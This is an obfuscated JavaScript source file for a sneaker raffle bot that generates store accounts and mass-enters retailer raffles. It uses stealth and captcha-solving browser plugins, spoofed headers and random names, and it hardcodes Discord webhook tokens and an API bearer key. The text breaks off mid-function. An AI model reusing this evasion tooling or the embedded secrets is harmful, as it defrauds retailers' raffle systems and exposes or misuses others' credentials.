const { EmbedBuilder: _0x15fe5b } = require('discord.js');
var _0x58c235 = require('exe');
const { execFile: _0x2fd160 } = require('child_process'), _0x2d6840 = require('puppeteer-extra'), _0x2e9f9f = require('puppeteer-extra-plugin-recaptcha'), _0x4c8616 = require('puppeteer-extra-plugin-stealth'), _0x1ee4d0 = require('chalk'), _0x2be893 = require('node-bash-title'), _0x2c62e3 = require('fs'), _0x1934a1 = require('axios'), _0x34012f = require('papaparse');
var _0x324188 = require('random-name');
const _0x434a82 = require('request');
var _0x3df5d6 = require('prompt');
const _0x6db637 = _0x434a82['jar']();
var _0x26509c = {};
const _0xa11c21 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x3bd948 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x8f9856 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x2a11a8 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4a38ba = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0xfeab8f = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x2606c3 = 'https://discord.com/api/webhooks/', _0x427df0 = '' + _0x2606c3 + _0x8f9856, _0x130765 = '' + _0x2606c3 + _0x2a11a8, _0xa7232c = '' + _0x2606c3 + _0xa11c21, _0x2664b3 = '' + _0x2606c3 + _0x3bd948, _0x19c58b = '' + _0x2606c3 + _0x4a38ba, _0x5cfa73 = '' + _0x2606c3 + _0xfeab8f;
const _0x12aa5 = JSON['parse'](_0x2c62e3['readFileSync']('../package.json', 'utf-8')), _0x23a95c = _0x12aa5['version'];
var _0x21572d, _0x246cb8, _0x18912e, _0x52bbd3, _0x24afeb, _0x191662, _0x136a13, _0x173056;
const _0x56ab36 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x49d6a1 = ![];
const _0xb48b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1a4f9c = '0123456789';
var _0x11cfdf = _0xb48b64['split']('');
const _0x32b201 = require('auto-git-update'), { PageEmittedEvents: _0x341cd3 } = require('puppeteer'), { getRandomValues: _0x6cb3cb } = require('crypto'), { resolve: _0x2e7d49 } = require('path'), { Console: _0x32ef1d } = require('console'), _0x15a1ea = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x31efff = new _0x32b201(_0x15a1ea);
async function _0xa05c8d() {
    _0x24afeb = _0x2c62e3['readdirSync']('../proxies'), _0x52bbd3 = _0x2c62e3['readdirSync']('../tasks'), _0x26509c = JSON['parse'](_0x2c62e3['readFileSync']('../settings.json', 'utf-8')), !_0x26509c['delay'] && (_0x26509c['delay'] = 0x2710, _0x2c62e3['writeFileSync']('../settings.json', JSON['stringify'](_0x26509c))), !_0x26509c['captchaKey'] && (_0x26509c['captchaKey'] = '', _0x2c62e3['writeFileSync']('../settings.json', JSON['stringify'](_0x26509c))), !_0x26509c['useRandomProxy'] && (_0x26509c['useRandomProxy'] = !![], _0x2c62e3['writeFileSync']('../settings.json', JSON['stringify'](_0x26509c))), !_0x26509c['webhook'] && (_0x26509c['webhook'] = '', _0x2c62e3['writeFileSync']('../settings.json', JSON['stringify'](_0x26509c))), _0x26509c['MahaDelay'] = _0x26509c['delay'], _0x2606c3 = _0x26509c['webhook'], _0x191662 = _0x26509c['licenseKey'];
}
let _0x27aabd, _0x2e2911 = [], _0x7fb500;
const _0x5df609 = _0x35cb7b => new Promise(_0x261c7b => setTimeout(_0x261c7b, _0x35cb7b));
function _0x561cbb(_0x205d51, _0x5c6e6e) {
    return Math['floor'](Math['random']() * (_0x5c6e6e - _0x205d51 + 0x1) + _0x205d51);
}
async function _0x55d6c9(_0x2861fa) {
    return _0x1934a1['get']('https://api.hyper.co/v4/licenses/' + _0x2861fa, { 'headers': { 'Authorization': 'Bearer\x20' + _0x56ab36 } })['then'](_0x44412d => _0x44412d['data'])['catch'](() => null);
}
;
async function _0x26e4ce(_0x63e210) {
    console['clear']();
    if (_0x63e210 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x583776 = await _0x3df5d6['get']('License');
        if (_0x583776['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x5df609(0xbb8), _0x26e4ce(_0x63e210);
        _0x63e210 = _0x583776['License'], _0x26509c['licenseKey'] = _0x63e210, _0x191662 = _0x63e210, _0x2c62e3['writeFileSync']('../settings.json', JSON['stringify'](_0x26509c));
    }
    console['log']('Checking\x20license\x20' + _0x191662 + '...'), await _0x5df609(0x320);
    const _0x98896 = await _0x55d6c9(_0x63e210);
    _0x136a13 = JSON['stringify'](_0x98896['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x173056 = JSON['stringify'](_0x98896['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x98896)
        return console['log']('License\x20not\x20found');
    if (!_0x98896['user'])
        return console['log']('License\x20not\x20bound');
    return _0x98896['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x49d6a1 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x49d6a1 = ![]);
}
async function _0xf29ad0() {
    var _0x5d2ab0 = await _0x3df5d6['get']('Module');
    return console['clear'](), _0x5d2ab0['Module'];
}
;
async function _0x846247() {
    var _0x3d4ba5 = await _0x3df5d6['get']('Setting');
    return console['clear'](), _0x3d4ba5['Setting'];
}
async function _0x1492c5() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x14bf2d = 0x0; _0x14bf2d < _0x52bbd3['length']; _0x14bf2d++) {
        console['log']('\x20(' + _0x14bf2d + ')\x20' + _0x52bbd3[_0x14bf2d]);
    }
    console['log']('');
    var _0x5b9452 = await _0x3df5d6['get']('Task');
    if (_0x5b9452['Task'] > _0x52bbd3['length'] - 0x1 || isNaN(_0x5b9452['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x5df609(0x3e8), _0x1492c5();
    var _0x43f153 = _0x2c62e3['readFileSync']('../tasks/' + _0x52bbd3[_0x5b9452['Task']], 'utf-8');
    return _0x18912e = _0x34012f['parse'](_0x43f153, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1ee4d0['blue'](_0x52bbd3[_0x5b9452['Task']])), _0x21572d = _0x52bbd3[_0x5b9452['Task']], _0x18912e;
}
async function _0xf8063d() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x4b778e = 0x0; _0x4b778e < _0x24afeb['length']; _0x4b778e++) {
        console['log']('\x20(' + _0x4b778e + ')\x20' + _0x24afeb[_0x4b778e]);
    }
    console['log']('');
    var _0x1dfc5e = await _0x3df5d6['get']('Proxies');
    if (_0x1dfc5e['Proxies'] > _0x24afeb['length'] - 0x1 || isNaN(_0x1dfc5e['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x5df609(0x3e8), _0xf8063d();
    var _0x1f9978 = _0x2c62e3['readFileSync']('../proxies/' + _0x24afeb[_0x1dfc5e['Proxies']], 'utf-8')['split']('\x0a');
    let _0xf1b1b3 = _0x1f9978['map']((_0x11938f, _0x5c9dad) => {
        sanatizeProxy = _0x11938f['replace']('\x0d', '');
        if (_0x1f9978[_0x5c9dad + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x246cb8 = _0x24afeb[_0x1dfc5e['Proxies']], console['clear'](), _0xf1b1b3;
}
async function _0xb65080() {
    var _0x396273 = await _0x3df5d6['get']('Value');
    return console['clear'](), _0x396273['Value'];
}
async function _0x20330a(_0x224c1a) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x4e3949 = 0x0; _0x4e3949 < _0x224c1a['length']; _0x4e3949++) {
        console['log']('\x20(' + _0x4e3949 + ')\x20[' + _0x224c1a[_0x4e3949]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x1bee39 = await _0x3df5d6['get']('Module');
    return _0x1bee39['Module'];
}
async function _0x37642a() {
    var _0x52f525 = await _0x3df5d6['get']('Password');
    return console['clear'](), _0x52f525['Password'];
}
;
async function _0x48d580() {
    var _0xd6166e = await _0x3df5d6['get']('Links');
    return _0xd6166e['Links'];
}
;
async function _0x558b2b() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x51e273 = 0x0; _0x51e273 < _0x2e2911['length']; _0x51e273++) {
        console['log']('\x20(' + _0x51e273 + ')\x20' + _0x2e2911[_0x51e273]);
    }
    ;
    console['log']();
    let _0x29be78 = await _0x3df5d6['get']('Product');
    return console['clear'](), _0x29be78['Product'];
}
;
function _0x4db3b7() {
    var _0x40e3c5 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x40e3c5;
}
;
const _0x57d163 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'WdVw7N',
                            'custom_source': 'DV3742-021',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'S8GH2D',
                                '$consent_form_version': 0x7d9216,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x2ebaaf(_0x2c785b, _0x4215f7) {
    let _0x5c93a4 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x23a95c != 'devkey') {
        await _0x1934a1['post'](_0x2c785b, _0x4215f7, _0x5c93a4);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x4ec2d3(_0x2e5da4, _0x10abf9, _0x25f0d3, _0x58b982, _0x433a50) {
    if (!_0x58b982 && _0x25f0d3 == 'dev') {
        var _0x18f3f5 = new _0x15fe5b()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x10abf9['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x10abf9['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x2e5da4['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x26509c['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x136a13,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x2e5da4['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x23a95c,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x18f3f5['data'];
    } else {
        if (_0x58b982 && _0x25f0d3 == 'dev') {
            var _0x18f3f5 = new _0x15fe5b()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x10abf9['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x136a13,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x10abf9['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x2e5da4['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x26509c['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x433a50,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x2e5da4['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x23a95c,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x18f3f5['data'];
        } else {
            if (_0x25f0d3 == 'pub') {
                var _0x18f3f5 = new _0x15fe5b()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x10abf9['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x10abf9['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x2e5da4['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x26509c['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x2e5da4['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x23a95c,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x18f3f5['data'];
            } else {
                if (_0x25f0d3 == 'acc' && !_0x58b982) {
                    var _0x18f3f5 = new _0x15fe5b()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x10abf9['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x136a13,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x10abf9['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x26509c['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x23a95c,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x18f3f5['data'];
                } else {
                    if (_0x25f0d3 == 'acc' && _0x58b982) {
                        var _0x18f3f5 = new _0x15fe5b()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x10abf9['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x136a13,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x433a50,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x10abf9['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x26509c['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x23a95c,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x18f3f5['data'];
                    } else {
                        if (_0x25f0d3 == 'open') {
                            var _0x18f3f5 = new _0x15fe5b()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x173056)['addFields']({
                                'name': 'User',
                                'value': '' + _0x136a13,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x23a95c,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x18f3f5['data'];
                        } else {
                            if (!_0x58b982 && _0x25f0d3 == 'ver') {
                                var _0x18f3f5 = new _0x15fe5b()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x10abf9['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x136a13,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x10abf9['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x26509c['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x23a95c,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x18f3f5['data'];
                            } else {
                                if (_0x58b982 && _0x25f0d3 == 'ver') {
                                    var _0x18f3f5 = new _0x15fe5b()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x10abf9['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x136a13,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x433a50,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x10abf9['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x26509c['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x23a95c,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x18f3f5['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x5a7b4a(_0x41e06e, _0x21df63) {
